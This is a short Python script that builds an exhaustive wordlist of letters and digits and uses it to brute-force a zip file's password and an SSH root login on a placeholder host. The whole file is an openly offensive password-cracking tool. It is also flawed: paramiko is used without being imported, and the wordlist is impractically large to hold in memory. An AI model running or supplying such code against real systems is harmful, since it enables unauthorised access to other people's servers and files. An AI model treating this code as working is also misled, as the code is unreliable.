import itertools
import zipfile

# Define the characters to be used in the wordlist
characters = "abcdefghijklmnopqrstuvwxyz0123456789"

# Define the maximum length of the password
max_length = 6

# Define the zip file to be brute-forced
zip_file = "example.zip"

# Define the SSH server to be brute-forced
ssh_host = "example.com"
ssh_user = "root"
ssh_password = "example_password"

# Generate a wordlist dynamically using the defined characters and maximum length
def generate_wordlist():
    wordlist = []
    for length in range(1, max_length + 1):
        for combination in itertools.product(characters, repeat=length):
            password = "".join(combination)
            wordlist.append(password)
    return wordlist

# Brute-force the zip file using the generated wordlist
def brute_force_zip():
    wordlist = generate_wordlist()
    with zipfile.ZipFile(zip_file, "r") as zip:
        for password in wordlist:
            try:
                zip.extractall(pwd=password.encode())
                print("[+] Password found:", password)
                return password
            except:
                pass
    print("[-] Password not found")

# Brute-force the SSH connection using the generated wordlist
def brute_force_ssh():
    wordlist = generate_wordlist()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in wordlist:
        try:
            client.connect(ssh_host, username=ssh_user, password=password)
            print("[+] Password found:", password)
            return password
        except:
            pass
    print("[-] Password not found")
    client.close()

# Call the functions to brute-force the zip file and SSH connection
brute_force_zip()
brute_force_ssh()
